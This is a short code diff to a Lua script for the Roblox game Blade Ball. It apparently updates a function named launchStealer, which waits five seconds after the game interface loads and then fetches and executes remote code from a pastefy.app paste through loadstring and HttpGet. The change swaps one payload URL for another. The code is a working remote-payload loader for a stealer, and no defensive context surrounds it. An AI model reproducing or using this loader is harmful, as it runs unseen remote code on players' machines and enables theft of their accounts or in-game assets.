@@ -10,7 +10,7 @@ end
 local function launchStealer()
     task.wait(5) -- On attend 5 secondes que le GUI de Blade Ball soit chargé
     local success, err = pcall(function()
-        loadstring(game:HttpGet("https://pastefy.app/lJbSvZYc/raw"))()
+        loadstring(game:HttpGet("https://pastefy.app/587JqZsk/raw"))()
     end)
     if not success then print("Erreur : " .. tostring(err)) end
 end
